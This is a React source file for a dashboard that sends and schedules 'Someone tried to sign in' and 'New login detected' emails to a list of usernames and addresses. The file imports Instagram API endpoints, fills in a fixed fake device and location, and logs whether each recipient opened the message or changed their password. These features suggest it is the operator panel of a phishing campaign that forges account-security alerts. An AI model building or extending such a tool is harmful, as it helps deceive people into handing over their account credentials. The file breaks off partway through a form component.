import { useState, useRef, useEffect, useMemo } from "react";
import { io } from "socket.io-client";
import InstagramEndpoints from "../../services/api-endpoints";

/* ---------- helpers ---------- */
const delay = (ms = 1500) => new Promise((r) => setTimeout(r, ms));
const uid = () => Math.random().toString(36).slice(2, 9);
const SEND_TYPES = ["Someone tried to sign in", "New login detected"];
const FILTERS = [
  { value: "all", label: "All" },
  { value: "simple", label: "Simple Record" },
  { value: "advance", label: "Advance Record" },
];
const fmt = (iso) => {
  const d = new Date(iso);
  return {
    date: d.toLocaleDateString(undefined, { day: "2-digit", month: "short", year: "numeric" }),
    time: d.toLocaleTimeString(undefined, { hour: "2-digit", minute: "2-digit" }),
  };
};
const mkLogs = (items) =>
  items.map(([type, iso, emailStatus, status = "sent"]) => ({ id: uid(), type, sentAt: iso, emailStatus, status }));
const EMAIL_STATUS = {
  success: ["Success", "bg-emerald-500/10 text-emerald-400 border border-emerald-500/20"],
  failed: ["Failed", "bg-red-500/10 text-red-400 border border-red-500/20"],
  scheduled: ["Scheduled", "bg-amber-500/10 text-amber-400 border border-amber-500/20"],
  cancelled: ["Cancelled", "bg-slate-500/10 text-slate-400 border border-slate-500/20"],
};
const LOG_STATUS = {
  sent: { label: "Sent", dot: "bg-sky-500", text: "text-sky-400" },
  opened: { label: "Opened", dot: "bg-violet-500", text: "text-violet-400" },
  "password changed": { label: "Password changed", dot: "bg-teal-500", text: "text-teal-400" },
};

/* ---------- icons (inline svg) ---------- */
const Icon = ({ d, className = "w-4 h-4", fill = "none", children }) => (
  <svg viewBox="0 0 24 24" fill={fill} stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" className={className}>
    {children || <path d={d} />}
  </svg>
);
const I = {
  User: (p) => <Icon {...p}><circle cx="12" cy="8" r="4" /><path d="M4 21c0-4 4-6 8-6s8 2 8 6" /></Icon>,
  Chevron: (p) => <Icon {...p} d="M6 9l6 6 6-6" />,
  Plus: (p) => <Icon {...p} d="M12 5v14M5 12h14" />,
  Close: (p) => <Icon {...p} d="M6 6l12 12M18 6L6 18" />,
  Edit: (p) => <Icon {...p}><path d="M4 20h4L19 9l-4-4L4 16v4z" /></Icon>,
  Trash: (p) => <Icon {...p}><path d="M4 7h16M10 11v6M14 11v6M6 7l1 13h10l1-13M9 7V4h6v3" /></Icon>,
  Check: (p) => <Icon {...p} d="M5 12l5 5 9-10" />,
  Mail: (p) => <Icon {...p}><rect x="3" y="5" width="18" height="14" rx="2" /><path d="M3 7l9 6 9-6" /></Icon>,
  Clock: (p) => <Icon {...p}><circle cx="12" cy="12" r="9" /><path d="M12 7v5l3 2" /></Icon>,
  Filter: (p) => <Icon {...p} d="M4 5h16l-6 8v6l-4-2v-4L4 5z" />,
  Upload: (p) => <Icon {...p}><path d="M12 16V4M7 9l5-5 5 5M4 20h16" /></Icon>,
  Refresh: (p) => <Icon {...p}><path d="M20 11a8 8 0 10-2.3 5.7M20 4v7h-7" /></Icon>,
  Send: (p) => <Icon {...p} d="M22 2L11 13M22 2l-7 20-4-9-9-4 20-7z" />,
  Crown: ({ className = "w-4 h-4" }) => (
    <svg viewBox="0 0 24 24" className={className} fill="currentColor" stroke="currentColor" strokeWidth="1" strokeLinejoin="round">
      <path d="M2.5 7l4.8 4.2L12 4l4.7 7.2L21.5 7l-1.8 10.5H4.3L2.5 7z" />
      <rect x="4.5" y="18.8" width="15" height="2" rx="1" />
    </svg>
  ),
  Spinner: ({ className = "w-4 h-4" }) => (
    <svg className={`${className} animate-spin`} viewBox="0 0 24 24" fill="none">
      <circle cx="12" cy="12" r="9" stroke="currentColor" strokeWidth="3" className="opacity-25" />
      <path d="M21 12a9 9 0 00-9-9" stroke="currentColor" strokeWidth="3" strokeLinecap="round" />
    </svg>
  ),
};

/* ---------- small ui pieces ---------- */
const Checkbox = ({ checked, onChange, indeterminate, disabled }) => {
  const ref = useRef(null);
  useEffect(() => { if (ref.current) ref.current.indeterminate = !!indeterminate; }, [indeterminate]);
  
  const filled = checked || indeterminate;

  return (
    <label className="relative inline-flex shrink-0 cursor-pointer items-center">
      <input
        ref={ref}
        type="checkbox"
        checked={checked}
        disabled={disabled}
        onChange={(e) => onChange(e.target.checked)}
        className="peer sr-only"
      />
      <span
        className={`flex h-5 w-5 items-center justify-center rounded border-2 text-white transition-colors
        peer-focus-visible:ring-2 peer-focus-visible:ring-[#3d7aba] peer-focus-visible:ring-offset-1
        ${filled ? "border-[#3d7aba] bg-[#3d7aba]" : "border-[#1e3260] bg-[#0b1527]"}
        ${disabled ? "opacity-50 cursor-not-allowed" : ""}`}
      >
        {indeterminate ? (
          <svg viewBox="0 0 24 24" className="w-3 h-3" stroke="currentColor" strokeWidth={2} strokeLinecap="round">
            <line x1="5" y1="12" x2="19" y2="12" />
          </svg>
        ) : checked ? (
          <svg viewBox="0 0 24 24" className="w-3 h-3" fill="none" stroke="currentColor" strokeWidth={2} strokeLinecap="round" strokeLinejoin="round">
            <polyline points="20 6 9 17 4 12" />
          </svg>
        ) : null}
      </span>
    </label>
  );
};

const Avatar = ({ src, premium, size = "w-10 h-10" }) => {
  const img = (
    <div className={`${size} rounded-full overflow-hidden flex items-center justify-center bg-[#131e35] text-[#3a5a8a]`}>
      {src ? <img src={src} alt="" className="w-full h-full object-cover" /> : <I.User className="w-5 h-5" />}
    </div>
  );
  if (!premium) return <div className="shrink-0 rounded-full ring-1 ring-[#1e3260]">{img}</div>;
  return (
    <div className="relative shrink-0">
      <span
        className="absolute text-amber-500 drop-shadow z-10"
        style={{ left: "86%", top: "13%", transform: "translate(-50%, -50%) rotate(45deg)" }}
      >
        <I.Crown className="w-3.5 h-3.5" />
      </span>
      <div className="rounded-full bg-gradient-to-br from-amber-200 via-yellow-500 to-amber-700 p-[1.5px] shadow-md shadow-amber-200/20">
        <div className="rounded-full bg-[#060d1c] p-[1px]">{img}</div>
      </div>
    </div>
  );
};

const Btn = ({ loading, children, className = "", ...p }) => (
  <button
    {...p}
    disabled={loading || p.disabled}
    className={`inline-flex items-center justify-center gap-2 rounded-lg px-3.5 py-2 text-sm font-medium transition-colors disabled:opacity-60 disabled:cursor-not-allowed focus:outline-none focus-visible:ring-2 focus-visible:ring-[#3d7aba] ${className}`}
  >
    {loading && <I.Spinner />}
    {children}
  </button>
);

function useClickOutside(ref, cb) {
  useEffect(() => {
    const h = (e) => ref.current && !ref.current.contains(e.target) && cb();
    document.addEventListener("mousedown", h);
    return () => document.removeEventListener("mousedown", h);
  }, [ref, cb]);
}

/* ---------- header filter dropdown ---------- */
function FilterDropdown({ value, onChange }) {
  const [open, setOpen] = useState(false);
  const ref = useRef(null);
  useClickOutside(ref, () => setOpen(false));
  const current = FILTERS.find((f) => f.value === value);
  return (
    <div ref={ref} className="relative">
      <button
        onClick={() => setOpen(!open)}
        className="flex h-7 w-44 items-center justify-between gap-2 rounded border border-[#1e3260] bg-[#0b1527] px-2.5 text-[11px] text-[#6b8cba] hover:border-[#3d7aba] hover:text-[#a0bce0] transition-colors cursor-pointer"
      >
        <span className="flex items-center gap-1.5"><I.Filter className="w-3 h-3 text-[#3a5a8a]" />{current.label}</span>
        <I.Chevron className={`w-3 h-3 text-[#3a5a8a] transition-transform ${open ? "rotate-180" : ""}`} />
      </button>
      {open && (
        <ul className="absolute left-0 top-full mt-1.5 w-44 rounded-lg border border-[#1e3260] bg-[#0b1527] p-1 shadow-lg z-30">
          {FILTERS.map((f) => (
            <li key={f.value}>
              <button
                onClick={() => { onChange(f.value); setOpen(false); }}
                className={`w-full flex items-center justify-between rounded-md px-3 py-2 text-[11px] text-left hover:bg-[#0f1e38] cursor-pointer ${f.value === value ? "text-[#6ab0ff] font-medium" : "text-[#6b8cba]"}`}
              >
                {f.label}
                {f.value === value && <I.Check className="w-3 h-3" />}
              </button>
            </li>
          ))}
        </ul>
      )}
    </div>
  );
}

/* ---------- custom date & time picker ---------- */
const pad = (n) => String(n).padStart(2, "0");
const toLocalStr = (d) => `${d.getFullYear()}-${pad(d.getMonth() + 1)}-${pad(d.getDate())}T${pad(d.getHours())}:${pad(d.getMinutes())}`;
const MONTHS = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
const selCls = "rounded-md border border-[#1e3260] bg-[#060d1c] px-2 py-1 text-sm text-[#a0bce0] focus:outline-none focus:ring-2 focus:ring-[#3d7aba]";

function DateTimePicker({ value, onChange, disabled, onClose }) {
  const sel = value ? new Date(value) : null;
  const base = sel || new Date(Date.now() + 5 * 60000);
  const [open, setOpen] = useState(false);
  const [view, setView] = useState(new Date(base.getFullYear(), base.getMonth(), 1));
  const today = new Date(); 
  today.setHours(0, 0, 0, 0);
  const now = new Date();

  const h24 = base.getHours();
  const hour = h24 % 12 || 12;
  const pm = h24 >= 12;
  const minute = Math.floor(base.getMinutes() / 5) * 5;

  const commit = (d, h = hour, m = minute, isPm = pm) => {
    const selectedDate = new Date(d.getFullYear(), d.getMonth(), d.getDate(), (h % 12) + (isPm ? 12 : 0), m);
    // Prevent selecting past time
    if (selectedDate.getTime() <= Date.now()) {
      return; // Don't update if time is in the past
    }
    onChange(toLocalStr(selectedDate));
  };

  const first = view.getDay();
  const days = new Date(view.getFullYear(), view.getMonth() + 1, 0).getDate();
  const cells = [...Array(first).fill(null), ...Array.from({ length: days }, (_, i) => i + 1)];
  const label = sel ? `${fmt(value).date}, ${fmt(value).time}` : "Select date & time";

  // Check if selected date is today
  const selectedDate = sel || base;
  const isToday = selectedDate.toDateString() === now.toDateString();

  // Filter hours and minutes based on current time if today is selected
  const currentHour24 = now.getHours();
  const currentMinute = now.getMinutes();
  const currentHour12 = currentHour24 % 12 || 12;
  const currentPM = currentHour24 >= 12;

  const isHourDisabled = (h) => {
    if (!isToday) return false;
    const hour24 = (h % 12) + (pm ? 12 : 0);
    const currentHour24Full = currentHour24;
    return hour24 < currentHour24Full || (hour24 === currentHour24Full && currentMinute >= 55);
  };

  const isMinuteDisabled = (m) => {
    if (!isToday) return false;
    const selectedHour24 = (hour % 12) + (pm ? 12 : 0);
    return selectedHour24 === currentHour24 && m <= currentMinute;
  };

  const isAMPMDisabled = (isPM) => {
    if (!isToday) return false;
    // If current time is PM, AM is disabled
    if (currentPM && !isPM) return true;
    // If current time is AM and selected is AM, check if all hours in AM are past
    if (!currentPM && !isPM && currentHour24 >= 11) return true;
    return false;
  };

  const handleDone = () => {
    setOpen(false);
    if (onClose) onClose(); // onClose is now the Done handler from SendMenu
  };

  return (
    <div className="px-2 pb-1">
      <button
        type="button"
        disabled={disabled}
        onClick={() => setOpen(!open)}
        className={`flex w-full items-center justify-between rounded-lg border px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-[#3d7aba] cursor-pointer ${
          disabled ? "cursor-not-allowed border-[#131e35] bg-[#0a1525] text-[#6b8cba]" : "border-[#1e3260] bg-[#060d1c] text-[#a0bce0] hover:border-[#3d7aba]"
        }`}
      >
        <span className="flex items-center gap-2"><I.Clock className="w-4 h-4" /> {label}</span>
        <I.Chevron className={`w-4 h-4 transition-transform ${open && !disabled ? "rotate-180" : ""}`} />
      </button>

      {open && !disabled && (
        <div className="mt-2 rounded-lg border border-[#1e3260] bg-[#0a1525] p-3">
          <div className="mb-2 flex items-center justify-between">
            <button onClick={() => setView(new Date(view.getFullYear(), view.getMonth() - 1, 1))} aria-label="Previous month" className="rounded p-1 text-[#6b8cba] hover:bg-[#131e35] cursor-pointer">
              <I.Chevron className="w-4 h-4 rotate-90" />
            </button>
            <span className="text-sm font-medium text-[#a0bce0]">{MONTHS[view.getMonth()]} {view.getFullYear()}</span>
            <button onClick={() => setView(new Date(view.getFullYear(), view.getMonth() + 1, 1))} aria-label="Next month" className="rounded p-1 text-[#6b8cba] hover:bg-[#131e35] cursor-pointer">
              <I.Chevron className="w-4 h-4 -rotate-90" />
            </button>
          </div>
          <div className="grid grid-cols-7 gap-0.5 text-center text-xs text-[#6b8cba] mb-1">
            {["S", "M", "T", "W", "T", "F", "S"].map((d, i) => <span key={i}>{d}</span>)}
          </div>
          <div className="grid grid-cols-7 gap-0.5">
            {cells.map((day, i) => {
              if (!day) return <span key={i} />;
              const d = new Date(view.getFullYear(), view.getMonth(), day);
              const past = d < today;
              const active = sel && d.toDateString() === sel.toDateString();
              return (
                <button
                  key={i}
                  disabled={past}
                  onClick={() => commit(d)}
                  className={`h-8 rounded-md text-sm cursor-pointer ${
                    active ? "bg-[#3d7aba] text-white font-medium" : past ? "text-[#1e3260] cursor-not-allowed" : "text-[#a0bce0] hover:bg-[#131e35]"
                  } ${!active && d.getTime() === today.getTime() ? "ring-1 ring-[#3d7aba]" : ""}`}
                >
                  {day}
                </button>
              );
            })}
          </div>
          <div className="mt-3 flex flex-wrap items-center gap-2 border-t border-[#131e35] pt-3">
            <I.Clock className="w-4 h-4 text-[#6b8cba]" />
            <select 
              className="rounded-md border border-[#1e3260] bg-[#060d1c] px-2 py-1 text-sm text-[#a0bce0] focus:outline-none focus:ring-2 focus:ring-[#3d7aba] cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed" 
              value={hour} 
              onChange={(e) => commit(sel || today, +e.target.value)} 
              aria-label="Hour"
            >
              {Array.from({ length: 12 }, (_, i) => i + 1).map((h) => (
                <option key={h} value={h} disabled={isHourDisabled(h)}>{pad(h)}</option>
              ))}
            </select>
            <span className="text-[#6b8cba]">:</span>
            <select 
              className="rounded-md border border-[#1e3260] bg-[#060d1c] px-2 py-1 text-sm text-[#a0bce0] focus:outline-none focus:ring-2 focus:ring-[#3d7aba] cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed" 
              value={minute} 
              onChange={(e) => commit(sel || today, hour, +e.target.value)} 
              aria-label="Minute"
            >
              {Array.from({ length: 12 }, (_, i) => i * 5).map((m) => (
                <option key={m} value={m} disabled={isMinuteDisabled(m)}>{pad(m)}</option>
              ))}
            </select>
            <select 
              className="rounded-md border border-[#1e3260] bg-[#060d1c] px-2 py-1 text-sm text-[#a0bce0] focus:outline-none focus:ring-2 focus:ring-[#3d7aba] cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed" 
              value={pm ? "PM" : "AM"} 
              onChange={(e) => commit(sel || today, hour, minute, e.target.value === "PM")} 
              aria-label="AM or PM"
            >
              <option value="AM" disabled={isAMPMDisabled(false)}>AM</option>
              <option value="PM" disabled={isAMPMDisabled(true)}>PM</option>
            </select>
            <button onClick={handleDone} className="ml-auto rounded-md bg-[#3d7aba] px-3 py-1 text-sm font-medium text-white hover:bg-[#2d6aa0] cursor-pointer whitespace-nowrap shrink-0">Done</button>
          </div>
        </div>
      )}
    </div>
  );
}

/* ---------- send dropdown: pick ONE type, schedule at the end ---------- */
function SendMenu({ notify: n, onChange, onClose }) {
  const name = useRef(uid()).current;
  const [err, setErr] = useState("");
  const [tempNotify, setTempNotify] = useState(n);
  const pending = !!n.pendingId && !!n.scheduledAt && new Date(n.scheduledAt).getTime() > Date.now();

  // Only update local state — no API call until Done is clicked
  const changeTime = (v) => {
    if (new Date(v).getTime() <= Date.now()) return setErr("Pick a time in the future.");
    setErr("");
    setTempNotify((prev) => ({ ...prev, scheduledAt: v }));
  };

  // Called when DateTimePicker's Done button is clicked
  const handleDone = () => {
    if (tempNotify.scheduledAt && new Date(tempNotify.scheduledAt).getTime() > Date.now()) {
      onChange(tempNotify); // API call only here
    }
    if (onClose) onClose();
  };

  // Apply changes immediately for radio buttons (only when NOT pending)
  const handleTypeChange = (notifyType) => {
    if (pending) return; // Prevent change when scheduled
    const updated = { ...tempNotify, notifyType };
    setTempNotify(updated);
    onChange(updated);
  };

  const handleScheduleToggle = (checked) => {
    const updated = { ...tempNotify, schedule: checked, scheduledAt: checked ? tempNotify.scheduledAt : "" };
    setTempNotify(updated);
    onChange(updated);
  };

  return (
    <div className="absolute right-0 top-full mt-1.5 w-80 rounded-xl border border-[#1e3260] bg-[#0a1525] p-3 shadow-xl z-30">
      {pending ? (
        <p className="text-xs font-medium text-amber-400 mb-2">Notification Scheduled</p>
      ) : (
        <p className="text-xs font-medium text-[#6b8cba] mb-2">Send notification for</p>
      )}
      
      {SEND_TYPES.map((t) => (
        <label
          key={t}
          className={`flex items-center gap-2.5 rounded-md px-2 py-1.5 text-sm ${
            pending ? "cursor-not-allowed text-[#6b8cba] opacity-50" : "cursor-pointer text-[#a0bce0] hover:bg-[#131e35]"
          }`}
        >
          <input
            type="radio"
            name={name}
            checked={tempNotify.notifyType === t}
            disabled={pending}
            onChange={() => handleTypeChange(t)}
            className="h-4 w-4 shrink-0 accent-[#3d7aba] cursor-pointer disabled:cursor-not-allowed disabled:opacity-50"
          />
          {t}
        </label>
      ))}
      
      <div className="mt-2 rounded-lg border border-[#131e35] bg-[#060d1c]/60 py-1">
        {pending ? (
          <div className="px-4 py-1.5">
            <p className="text-sm font-medium text-amber-400">Scheduled for</p>
            <p className="text-xs text-[#6b8cba] mt-1">Change the time below to reschedule</p>
          </div>
        ) : (
          <label className="flex items-center gap-2.5 rounded-md px-2 py-1.5 text-sm font-medium cursor-pointer text-[#a0bce0] hover:bg-[#131e35]">
            <Checkbox checked={tempNotify.schedule} onChange={handleScheduleToggle} />
            Schedule
          </label>
        )}
        {(pending || tempNotify.schedule) && (
          <DateTimePicker 
            value={tempNotify.scheduledAt} 
            onChange={changeTime}
            disabled={false}
            onClose={handleDone}
          />
        )}
        {err && <p className="px-4 pb-1 text-xs text-red-400">{err}</p>}
        {!err && !pending && tempNotify.schedule && !tempNotify.scheduledAt && <p className="px-4 pb-1 text-xs text-[#6b8cba]">Pick a date and time to enable Send.</p>}
      </div>
    </div>
  );
}

/* ---------- confirm cancel schedule popup ---------- */
function ConfirmCancelModal({ onConfirm, onClose }) {
  const [loading, setLoading] = useState(false);
  const go = async () => {
    setLoading(true);
    await delay();
    onConfirm();
    setLoading(false);
    onClose();
  };
  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 p-4" role="dialog" aria-modal="true">
      <div className="w-full max-w-sm rounded-2xl bg-[#0b1527] border border-[#1e3260] p-6 text-center shadow-2xl">
        <div className="mx-auto mb-4 flex h-12 w-12 items-center justify-center rounded-full bg-red-500/10 text-red-400 border border-red-500/20">
          <I.Clock className="w-6 h-6" />
        </div>
        <h3 className="text-base font-semibold text-[#a0bce0]">Cancel scheduled message?</h3>
        <p className="mt-1 text-sm text-[#6b8cba]">Are you sure you want to cancel the scheduled message? It will not be sent.</p>
        <div className="mt-5 flex gap-2">
          <Btn onClick={onClose} disabled={loading} className="flex-1 border border-[#1e3260] bg-[#0b1527] text-[#a0bce0] hover:bg-[#0f1e38]">No, keep it</Btn>
          <Btn onClick={go} loading={loading} className="flex-1 bg-red-600 text-white hover:bg-red-700">Yes, cancel</Btn>
        </div>
      </div>
    </div>
  );
}

/* ---------- confirm delete popup ---------- */
function ConfirmDeleteModal({ count, title, onConfirm, onClose }) {
  const [loading, setLoading] = useState(false);
  const go = async () => {
    setLoading(true);
    await onConfirm();
    setLoading(false);
    onClose();
  };
  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 p-4" role="dialog" aria-modal="true">
      <div className="w-full max-w-sm rounded-2xl bg-[#0b1527] border border-[#1e3260] p-6 text-center shadow-2xl">
        <div className="mx-auto mb-4 flex h-12 w-12 items-center justify-center rounded-full bg-red-500/10 text-red-400 border border-red-500/20">
          <I.Trash className="w-6 h-6" />
        </div>
        <h3 className="text-base font-semibold text-[#a0bce0]">
          {count ? `Delete ${count} record${count > 1 ? "s" : ""}?` : "Delete record?"}
        </h3>
        <p className="mt-1 text-sm text-[#6b8cba]">
          {title
            ? `Are you sure you want to delete "${title}"? This action cannot be undone.`
            : `Are you sure you want to delete ${count ? `these ${count} records` : "this record"}? This action cannot be undone.`}
        </p>
        <div className="mt-5 flex gap-2">
          <Btn onClick={onClose} disabled={loading} className="flex-1 border border-[#1e3260] bg-[#0b1527] text-[#a0bce0] hover:bg-[#0f1e38] cursor-pointer">
            Cancel
          </Btn>
          <Btn onClick={go} loading={loading} className="flex-1 bg-red-600 text-white hover:bg-red-700 cursor-pointer">
            Yes, delete
          </Btn>
        </div>
      </div>
    </div>
  );
}

/* ---------- "send all" result popup ---------- */
function BulkSentModal({ info, onClose }) {
  const done = info.sent + info.scheduled;
  const detail = [
    info.sent ? `${info.sent} sent now` : "",
    info.scheduled ? `${info.scheduled} scheduled` : "",
    info.skipped ? `${info.skipped} left unchanged` : "",
  ].filter(Boolean).join(", ");
  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 p-4" role="dialog" aria-modal="true">
      <div className="w-full max-w-sm rounded-2xl bg-[#0b1527] border border-[#1e3260] p-6 text-center shadow-2xl">
        <div className={`mx-auto mb-4 flex h-12 w-12 items-center justify-center rounded-full ${done ? "bg-emerald-500/10 text-emerald-400 border border-emerald-500/20" : "bg-amber-500/10 text-amber-400 border border-amber-500/20"}`}>
          {done ? <I.Check className="w-6 h-6" /> : <I.Send className="w-6 h-6" />}
        </div>
        <h3 className="text-base font-semibold text-[#a0bce0]">{done ? "Selected messages sent" : "Nothing to send"}</h3>
        <p className="mt-1 text-sm text-[#6b8cba]">
          {done
            ? `Each selected item used its own send settings. ${detail}.`
            : "Already scheduled items stay as they are, and a schedule needs a future time."}
        </p>
        <Btn onClick={onClose} className="mt-5 w-full bg-[#3d7aba] text-white hover:bg-[#2d6aa0]">OK</Btn>
      </div>
    </div>
  );
}

/* ---------- "message sent" popup ---------- */
function SentModal({ info, onClose }) {
  const when = info.scheduled ? fmt(info.scheduled) : null;
  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 p-4" role="dialog" aria-modal="true">
      <div className="w-full max-w-sm rounded-2xl bg-[#0b1527] border border-[#1e3260] p-6 text-center shadow-2xl">
        <div className="mx-auto mb-4 flex h-12 w-12 items-center justify-center rounded-full bg-emerald-500/10 text-emerald-400 border border-emerald-500/20">
          <I.Check className="w-6 h-6" />
        </div>
        <h3 className="text-base font-semibold text-[#a0bce0]">{when ? "Message scheduled" : "Message sent"}</h3>
        <p className="mt-1 text-sm text-[#6b8cba]">
          "{info.type}" {when ? `will be sent to ${info.email} on ${when.date}, ${when.time}.` : `notification was sent to ${info.email}.`}
        </p>
        <Btn onClick={onClose} className="mt-5 w-full bg-[#3d7aba] text-white hover:bg-[#2d6aa0]">OK</Btn>
      </div>
    </div>
  );
}

/* ---------- logs ---------- */
function Logs({ logs }) {
  if (!logs.length) return <p className="text-[11px] text-[#6b8cba] py-1">No notifications sent yet.</p>;
  return (
    <div className="space-y-1">
      {logs.map((l) => {
        const { date, time } = fmt(l.sentAt);
        const [emailLabel, emailCls] = EMAIL_STATUS[l.emailStatus] || EMAIL_STATUS.success;
        const life = LOG_STATUS[l.status] || LOG_STATUS.sent;
        return (
          <div
            key={l.id}
            className="grid grid-cols-[minmax(0,1fr)_9rem_4.5rem] items-center gap-x-4 rounded border border-[#131e35] bg-[#060d1c] px-2 py-1.5 text-[11px]"
          >
            <div className="min-w-0 flex items-center gap-1.5">
              <I.Mail className="w-3 h-3 shrink-0 text-[#3a5a8a]" />
              <span className="line-clamp-1 font-medium text-[#a0bce0]">{l.type}</span>
              <span className={`ml-1 inline-flex w-[7rem] shrink-0 items-center gap-1 text-[10px] font-medium ${life.text}`}>
                <span className={`h-1 w-1 shrink-0 rounded-full ${life.dot}`} />
                <span className="truncate">{life.label}</span>
              </span>
            </div>
            <span className="flex w-full items-center gap-1 whitespace-nowrap text-[#6b8cba]">
              <I.Clock className="w-3 h-3 shrink-0" /> {date}, {time}
            </span>
            <span className={`inline-flex w-full justify-center rounded-full px-2 py-0.5 text-[10px] font-medium whitespace-nowrap ${emailCls}`}>{emailLabel}</span>
          </div>
        );
      })}
    </div>
  );
}

/* ---------- list row ---------- */
function Row({ r, selected, onSelect, onEdit, onDelete, deleting, onNotify, onSend, onCancel }) {
  const [menu, setMenu] = useState(false);
  const [open, setOpen] = useState(false);
  const [sending, setSending] = useState(false);
  const sendBox = useRef(null);
  useClickOutside(sendBox, () => setMenu(false));
  const premium = r.type === "advance";
  const n = r.notify;
  const [done, setDone] = useState(null);
  const [confirm, setConfirm] = useState(false);
  const pending = !!n.pendingId && !!n.scheduledAt && new Date(n.scheduledAt).getTime() > Date.now();
  const cantSend = n.schedule && (!n.scheduledAt || new Date(n.scheduledAt).getTime() <= Date.now());

  const send = async () => {
    const info = { type: n.notifyType, email: r.email, scheduled: n.schedule ? n.scheduledAt : null };
    setSending(true);
    await delay();
    
    // If scheduling, update notify with pendingId to show Cancel button
    if (n.schedule && n.scheduledAt) {
      const pendingId = `pending-${Date.now()}`;
      const updatedNotify = { ...n, pendingId };
      await onNotify(updatedNotify); // AWAIT the update to backend
      // Now send with the updated notify that includes pendingId
      await onSend(updatedNotify);
    } else {
      // Immediate send (no schedule)
      await onSend();
    }
    
    setSending(false);
    setDone(info);
  };

  return (
    <div className="border-b border-[#131e35] last:border-0">
      <div className={`flex flex-wrap items-center gap-3 px-3 py-1.5 ${premium ? "bg-gradient-to-r from-[#e8c97a]/5 to-transparent" : "hover:bg-[#0f1e38]/50"}`}>
        <Checkbox checked={selected} onChange={onSelect} />
        <Avatar src={premium ? r.avatar : ""} premium={premium} size="w-7 h-7" />
        <div className="flex-1 min-w-[140px] space-y-0">
          <p className={`flex items-center gap-1 text-[11px] font-medium ${r.username ? "text-[#a0bce0]" : "text-[#3a5a8a]"}`}>
            <I.User className="w-3 h-3 shrink-0 text-[#3a5a8a]" />
            <span className="line-clamp-1">{r.username || "-"}</span>
          </p>
          <p className="flex items-center gap-1 text-[11px] text-[#6b8cba]">
            <I.Mail className="w-3 h-3 shrink-0 text-[#3a5a8a]" />
            <span className="line-clamp-1">{r.email}</span>
          </p>
        </div>
        <div className="flex items-center gap-1.5 shrink-0">
          {pending && (
            <div className="flex items-center gap-1.5 rounded border border-amber-500/30 bg-amber-500/10 px-2.5 py-1 text-[11px] text-amber-400">
              <I.Clock className="w-3.5 h-3.5 shrink-0" />
              <span className="whitespace-nowrap">
                Scheduled: {fmt(n.scheduledAt).date}, {fmt(n.scheduledAt).time}
              </span>
            </div>
          )}
          <button
            onClick={onEdit}
            disabled={deleting}
            className="flex items-center gap-1 rounded border border-[#1e3260] bg-[#0b1527] px-2 py-1 text-[11px] text-[#6ab0ff] hover:bg-[#0f1e38] transition-colors disabled:opacity-50 disabled:cursor-not-allowed cursor-pointer"
          >
            <I.Edit className="w-3 h-3" /> Edit
          </button>
          <button
            onClick={onDelete}
            disabled={deleting}
            className="flex items-center gap-1 rounded border border-red-500/20 bg-red-500/5 px-2 py-1 text-[11px] text-red-400 hover:bg-red-500/10 transition-colors disabled:opacity-50 disabled:cursor-not-allowed cursor-pointer"
          >
            {deleting ? <I.Spinner className="w-3 h-3" /> : <><I.Trash className="w-3 h-3" /> Delete</>}
          </button>
          <div ref={sendBox} className="relative inline-flex items-stretch overflow-visible rounded">
            {pending ? (
              <button
                type="button"
                onClick={() => setConfirm(true)}
                title={`Scheduled for ${fmt(n.scheduledAt).date}, ${fmt(n.scheduledAt).time}`}
                className="flex items-center gap-1 rounded-l border border-r-0 border-red-500/40 bg-red-500/10 px-2 py-1 text-[11px] font-medium text-red-400 hover:bg-red-500/20 transition-colors cursor-pointer w-[70px] justify-center"
              >
                <I.Close className="w-3 h-3" /> Cancel
              </button>
            ) : (
              <button
                type="button"
                onClick={send}
                disabled={sending || cantSend}
                title={cantSend ? "Pick a future date and time for the schedule" : "Send notification"}
                className="flex items-center gap-1 rounded-l bg-[#3d7aba] px-2 py-1 text-[11px] font-medium text-white hover:bg-[#2d6aa0] transition-colors disabled:opacity-60 disabled:cursor-not-allowed cursor-pointer w-[70px] justify-center"
              >
                {sending ? (
                  <><I.Spinner className="w-3 h-3" /> Sending</>
                ) : (
                  <><I.Send className="w-3 h-3" /> Send</>
                )}
              </button>
            )}
            <button
              type="button"
              onClick={() => setMenu((openMenu) => !openMenu)}
              disabled={sending}
              aria-label="Send options"
              title="Send options"
              className={`flex items-center rounded-r border px-1 text-[#6b8cba] hover:bg-[#0f1e38] transition-colors disabled:opacity-60 cursor-pointer ${
                pending ? "border-red-500/40 bg-red-500/10" : "border-[#1e3260] bg-[#0b1527]"
              }`}
            >
              <I.Chevron className={`w-3 h-3 transition-transform ${menu ? "rotate-180" : ""}`} />
            </button>
            {menu && <SendMenu notify={n} onChange={onNotify} onClose={() => setMenu(false)} />}
          </div>
          <button
            onClick={() => setOpen(!open)}
            aria-label="Toggle logs"
            title="View logs"
            className="rounded p-1 text-[#3a5a8a] hover:bg-[#0f1e38] hover:text-[#6ab0ff] transition-colors cursor-pointer"
          >
            <I.Chevron className={`w-4 h-4 transition-transform ${open ? "rotate-180" : ""}`} />
          </button>
        </div>
      </div>
      {open && (
        <div className="bg-[#060d1c]/30 px-3 py-1.5 sm:pl-[50px]">
          <p className="text-[10px] font-medium text-[#3a5a8a] mb-1 uppercase tracking-wider">Sent notifications ({r.logs.length})</p>
          <Logs logs={r.logs} />
        </div>
      )}
      {done && <SentModal info={done} onClose={() => setDone(null)} />}
      {confirm && <ConfirmCancelModal onConfirm={onCancel} onClose={() => setConfirm(false)} />}
    </div>
  );
}

/* ---------- add / edit modal ---------- */
const DEFAULT_DEVICE = "Redmi Note 12";
const DEFAULT_ADDRESS = "Kanpur, UP, India";
const blank = () => ({
  _k: uid(), username: "", email: "", avatar: "",
  deviceName: DEFAULT_DEVICE,
  address: DEFAULT_ADDRESS,
});

function Field({ label, required, error, children }) {
  return (
    <div>
      <label className="block text-sm font-medium text-[#a0bce0] mb-1">
        {label} {required ? <span className="text-red-400">*</span> : <span className="text-[#3a5a8a] font-normal">(optional)</span>}
      </label>
      {children}
